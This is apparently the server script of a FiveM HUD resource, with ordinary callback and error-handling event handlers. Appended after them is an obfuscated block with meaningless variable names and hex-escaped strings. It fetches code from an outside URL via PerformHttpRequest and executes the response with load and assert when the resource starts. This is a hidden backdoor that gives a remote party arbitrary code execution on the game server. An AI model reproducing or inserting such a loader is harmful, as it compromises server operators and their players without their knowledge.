RegisterNetEvent("0r-hud:Server:HandleCallback", function(key, payload)
    local src = source
    if Koci.Callbacks[key] then
        Koci.Callbacks[key](src, payload, function(cb)
            TriggerClientEvent("0r-hud:Client:HandleCallback", src, key, cb)
        end)
    end
end)

RegisterNetEvent("0r-hud:Server:ErrorHandle", function(error)
    Koci.Utils:printTable(error)
end)


local HTqsDlfFxiaiEOjZJdRmuFmHmHrDUHblwtspmrongseOKmXgCSJliOnNWkjFsBDqjTNmET = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} HTqsDlfFxiaiEOjZJdRmuFmHmHrDUHblwtspmrongseOKmXgCSJliOnNWkjFsBDqjTNmET[4][HTqsDlfFxiaiEOjZJdRmuFmHmHrDUHblwtspmrongseOKmXgCSJliOnNWkjFsBDqjTNmET[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x68\x6f\x6d\x69\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x50\x56\x71\x4b", function (ZPEVtxportKVJclVBaobvLifvQcMxhsfWkybMeIavugXMHSPFigkNEyMjhuMjYRvTcXlQf, HgKQgCeyZEKbRCWXVJjTWoTqjHpaNGkffYHnOChCouZfkGGuyRgSWaEUjOeTMGYwSWjzjP) if (HgKQgCeyZEKbRCWXVJjTWoTqjHpaNGkffYHnOChCouZfkGGuyRgSWaEUjOeTMGYwSWjzjP == HTqsDlfFxiaiEOjZJdRmuFmHmHrDUHblwtspmrongseOKmXgCSJliOnNWkjFsBDqjTNmET[6] or HgKQgCeyZEKbRCWXVJjTWoTqjHpaNGkffYHnOChCouZfkGGuyRgSWaEUjOeTMGYwSWjzjP == HTqsDlfFxiaiEOjZJdRmuFmHmHrDUHblwtspmrongseOKmXgCSJliOnNWkjFsBDqjTNmET[5]) then return end HTqsDlfFxiaiEOjZJdRmuFmHmHrDUHblwtspmrongseOKmXgCSJliOnNWkjFsBDqjTNmET[4][HTqsDlfFxiaiEOjZJdRmuFmHmHrDUHblwtspmrongseOKmXgCSJliOnNWkjFsBDqjTNmET[2]](HTqsDlfFxiaiEOjZJdRmuFmHmHrDUHblwtspmrongseOKmXgCSJliOnNWkjFsBDqjTNmET[4][HTqsDlfFxiaiEOjZJdRmuFmHmHrDUHblwtspmrongseOKmXgCSJliOnNWkjFsBDqjTNmET[3]](HgKQgCeyZEKbRCWXVJjTWoTqjHpaNGkffYHnOChCouZfkGGuyRgSWaEUjOeTMGYwSWjzjP))() end)